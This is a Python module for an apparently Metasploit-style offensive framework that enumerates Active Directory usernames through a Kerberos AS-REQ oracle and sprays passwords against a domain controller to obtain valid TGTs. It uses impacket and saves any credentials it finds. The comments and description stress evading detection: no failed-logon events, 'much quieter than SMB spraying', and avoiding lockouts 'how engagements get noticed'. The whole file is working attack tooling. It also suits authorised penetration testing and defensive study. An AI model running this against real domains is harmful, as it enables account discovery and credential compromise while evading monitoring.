"""Kerberos login validation + username enumeration (AS-REQ oracle).

Two modes against the KDC, no SMB involved (so no 4625 noise on the DC's
security log):

  ENUM     — one bare AS-REQ per username, NO preauth data. The answer is
             the oracle: PREAUTH_REQUIRED or an AS-REP means the account
             exists; C_PRINCIPAL_UNKNOWN means it doesn't. No preauth
             data is sent, so no account state is touched — zero lockout
             surface, zero failed-logon events. Safe for big user lists.
  VALIDATE — full AS-REQ with PA_ENC_TIMESTAMP per user:password combo.
             Success is a real TGT (a credential you can use). These ARE
             counted failed logons when wrong, and the first
             CLIENT_REVOKED (locked/disabled) aborts the host — spraying
             into a lockout policy is how engagements get noticed.

build_as_req is vendored from asreproast.py — keep them in sync.
"""

import datetime
import random
import time

from core.brute import brute_force
from core.module import AuxiliaryModule
from core.options import OptAddress, OptBool, OptInt, OptString
from core.wordlists import build_combos, creds_from_options

try:
    from impacket.krb5 import constants
    from impacket.krb5.asn1 import AS_REQ, seq_set, seq_set_iter
    from impacket.krb5.kerberosv5 import (
        KerberosError,
        getKerberosTGT,
        sendReceive,
    )
    from impacket.krb5.types import KerberosTime, Principal
    from pyasn1.codec.der import encoder
except ImportError:
    constants = KerberosError = Principal = None
    AS_REQ = KerberosTime = seq_set = seq_set_iter = None
    encoder = getKerberosTGT = sendReceive = None

ERROR_CIRCUIT = 3  # consecutive transport errors before a host is skipped


def build_as_req(user, domain):
    """AS-REQ with no preauthentication data. Vendored from asreproast.py
    — keep in sync."""
    as_req = AS_REQ()
    as_req["pvno"] = 5
    as_req["msg-type"] = int(constants.ApplicationTagNumbers.AS_REQ.value)
    req_body = seq_set(as_req, "req-body")
    req_body["kdc-options"] = constants.encodeFlags([
        constants.KDCOptions.forwardable.value,
        constants.KDCOptions.proxiable.value,
    ])
    req_body["realm"] = domain
    name = Principal(user, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
    seq_set(req_body, "cname", name.components_to_asn1)
    server = Principal(f"krbtgt/{domain}",
                       type=constants.PrincipalNameType.NT_SRV_INST.value)
    seq_set(req_body, "sname", server.components_to_asn1)
    now = datetime.datetime.utcnow()
    req_body["till"] = KerberosTime.to_asn1(now + datetime.timedelta(days=1))
    req_body["rtime"] = KerberosTime.to_asn1(now)
    req_body["nonce"] = random.getrandbits(31)
    seq_set_iter(req_body, "etype", (int(constants.EncryptionTypes.rc4_hmac.value),))
    return encoder.encode(as_req)


class KerberosLogin(AuxiliaryModule):
    name = "Kerberos Login / Userenum (AS-REQ oracle)"
    description = """
        VALIDATE (default): full pre-auth per user:password combo against
        the KDC — a hit is a real TGT. ENUM true: bare AS-REQs only, no
        preauth data — answers user-exists / user-unknown with zero
        lockout surface and no failed-logon events. VALIDATE attempts
        count as failed logons; CLIENT_REVOKED aborts the host. Stored
        creds are tried first. Much quieter than SMB spraying: nothing
        but port 88 traffic.
    """
    authors = ["you"]
    requirements = ["impacket"]

    def register_options(self):
        self.options.add(OptAddress("RHOSTS", required=True,
                                    description="Domain controller(s) / KDC"))
        self.options.add(OptString("DOMAIN", required=True,
                                   description="Domain/realm, e.g. forge.local"))
        self.options.add(OptString("USERNAME", default="",
                                   description="Username(s), comma-separated"))
        self.options.add(OptString("USER_FILE", default="", description="Usernames file"))
        self.options.add(OptString("PASSWORD", default="", description="Single password"))
        self.options.add(OptString("PASS_FILE", default="", description="Passwords file"))
        self.options.add(OptBool("ENUM", default=False,
                                 description="Enumerate usernames only (no "
                                             "passwords, zero lockout surface)"))
        self.options.add(OptInt("THREADS", default=4,
                                description="Concurrent attempts"))
        self.options.add(OptInt("TIMEOUT", default=5, description="KDC timeout (seconds)"))

    # ------------------------------------------------------------- attempts
    def _try_enum(self, host, domain, user):
        """Bare AS-REQ -> exists | notfound | error. Sends no preauth
        data — the KDC's answer alone is the oracle."""
        try:
            response = sendReceive(build_as_req(user, domain), domain, host)
        except KerberosError as e:
            code = int(e.getErrorCode())
            if code == constants.ErrorCodes.KDC_ERR_C_PRINCIPAL_UNKNOWN.value:
                return "fail", "unknown user"
            # PREAUTH_REQUIRED (and anything account-shaped) means exists
            return "success", f"exists (0x{code:x})"
        except OSError as e:
            return "error", str(e)
        if response[0] == 0x7E:  # KRB_ERROR
            return "success", "exists"
        return "success", "exists (AS-REP — no preauth required!)"

    def _try_validate(self, host, domain, state, user, password):
        """Full AS-REQ with PA_ENC_TIMESTAMP -> success | fail | error.
        CLIENT_REVOKED (locked/disabled) opens the host circuit."""
        if state["abort"]:
            return None
        principal = Principal(user, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
        try:
            getKerberosTGT(principal, password, domain, "", "", kdcHost=host)
            return "success", "valid TGT"
        except KerberosError as e:
            code = int(e.getErrorCode())
            if code == constants.ErrorCodes.KDC_ERR_CLIENT_REVOKED.value:
                state["abort"] = True
                state["locked"] = user
            return "fail", f"0x{code:x}"
        except OSError as e:
            state["errors"] += 1
            if state["errors"] >= ERROR_CIRCUIT:
                state["abort"] = True
                state["dead"] = str(e)
            return "error", str(e)

    # ------------------------------------------------------------------ run
    def run(self):
        try:
            raw_users = creds_from_options(self.get_option, "USERNAME", "USER_FILE")
        except OSError as e:
            self.print_error(f"Cannot read user file: {e}")
            return
        # usernames comma-split (sprays need lists inline); passwords never
        # do — commas are legal password characters
        users = [u.strip() for v in raw_users for u in v.split(",") if u.strip()]
        enum = bool(self.get_option("ENUM"))
        if enum:
            passwords = [""]
        else:
            try:
                passwords = creds_from_options(self.get_option, "PASSWORD", "PASS_FILE")
            except OSError as e:
                self.print_error(f"Cannot read password file: {e}")
                return
        if not users or not passwords:
            self.print_error("Need usernames (USERNAME/USER_FILE)"
                             + ("" if enum else " and passwords "
                                "(PASSWORD/PASS_FILE)"))
            return

        domain = str(self.get_option("DOMAIN")).upper()
        timeout = int(self.get_option("TIMEOUT"))
        combos = list(build_combos(users, passwords))
        mode = "ENUM" if enum else "VALIDATE"
        self.print_status(f"{mode}: {len(users)} user(s) x "
                          f"{len(passwords)} password(s) = {len(combos)} attempt(s)")
        for host in [h.strip() for h in str(self.get_option("RHOSTS")).split(",")
                     if h.strip()]:
            if enum:
                self._enum_host(host, domain, timeout, combos)
            else:
                self._validate_host(host, domain, timeout, combos)

    def _enum_host(self, host, domain, timeout, combos):
        attempt = lambda u, _p: self._try_enum(host, domain, u)  # noqa: E731
        classify = lambda verdict: verdict[0]  # noqa: E731

        def on_success(combo, result):
            self.print_good(f"{host}: {combo[0]} — {result[1]}")

        started = time.time()
        found, attempts, errors, possibles = brute_force(
            combos, attempt, classify,
            threads=self.get_option("THREADS"),
            join_timeout=timeout + 2,
            on_success=on_success,
        )
        elapsed = max(time.time() - started, 0.001)
        self.print_status(f"{host}: {attempts} probed in {elapsed:.1f}s, "
                          f"{len(found)} exist, {errors} errors")

    def _validate_host(self, host, domain, timeout, combos):
        store = getattr(self.framework, "store", None)
        if store is not None:
            stored = store.creds_for(host, "kerberos")
            if stored:
                self.print_status(
                    f"{host}: trying {len(stored)} stored credential(s) first")
                stored_set = set(stored)
                combos = stored + [c for c in combos if c not in stored_set]

        state = {"abort": False, "errors": 0, "locked": None, "dead": None}
        attempt = lambda u, p: self._try_validate(host, domain, state, u, p)  # noqa: E731
        classify = lambda verdict: verdict[0]  # noqa: E731

        def on_success(combo, _result):
            self.print_good(f"{host}: valid credential {combo[0]}:{combo[1]}")

        started = time.time()
        found, attempts, errors, possibles = brute_force(
            combos, attempt, classify,
            threads=self.get_option("THREADS"),
            join_timeout=timeout + 2,
            on_success=on_success,
        )
        elapsed = max(time.time() - started, 0.001)
        if state["locked"]:
            self.print_warning(
                f"{host}: CLIENT_REVOKED on {state['locked']} "
                f"(locked/disabled) — remaining combos skipped")
        if state["dead"]:
            self.print_warning(
                f"{host}: {ERROR_CIRCUIT} consecutive transport errors "
                f"({state['dead']}) — host skipped")
        self.print_status(f"{host}: {attempts} attempts in {elapsed:.1f}s, "
                          f"{len(found)} valid, {errors} errors")

        if store is not None and found:
            store.add_service(host, 88, name="kerberos")
            for user, pw in found:
                store.add_cred(host, "kerberos", user, pw,
                               source="kerb-login")
                self.print_status("Credential saved ('creds' to view)")
